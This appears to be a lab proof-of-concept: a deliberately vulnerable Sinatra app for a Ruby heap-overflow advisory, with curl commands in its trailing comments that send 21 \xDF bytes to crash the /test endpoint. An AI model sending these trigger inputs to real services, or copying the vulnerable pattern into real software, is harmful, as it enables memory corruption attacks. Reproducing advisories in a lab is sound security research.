#!/usr/bin/env ruby
# frozen_string_literal: true

# Sinatra HTTP entry point demonstrating the external attack surface
# for GHSA-34m4-m9fh-gqp5 (Ruby2Shell).
#
# In classic-style Sinatra (and default Rails configurations), user input
# can reach force_encoding + case conversion without authentication.
#
# WARNING: This is a VULNERABLE application for lab use only.
# Do not expose to untrusted networks.

require "sinatra"

set :bind, "0.0.0.0"
set :port, 4567

get "/test" do
  content_type "text/plain"

  input = params[:input] || ""

  # Simulate common application behavior: accept raw bytes,
  # force legacy encoding, then case-convert for display/storage.
  s = input.dup.force_encoding("ISO-8859-1")

  # VULNERABLE: triggers one-byte heap overflow when input contains
  # 21+ consecutive \xDF bytes and upcase is called.
  result = s.upcase

  "Input length: #{input.bytesize}\n" \
  "Result: #{result}\n"
end

get "/health" do
  "ok\n"
end

__END__

# Usage:
#   cd app && bundle exec ruby sinatra_entrypoint.rb
#
# Test (safe):
#   curl "http://localhost:4567/test?input=hello"
#
# Test (trigger — 21 sharp-s characters):
#   curl "http://localhost:4567/test?input=$(python3 -c 'import sys; sys.stdout.buffer.write(b\"\xDF\" * 21)')"
#
# Or with URL encoding:
#   curl "http://localhost:4567/test?input=%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF%DF"
#
# Expected (under Valgrind / ASAN):
#   heap-buffer-overflow or Invalid write in case_map
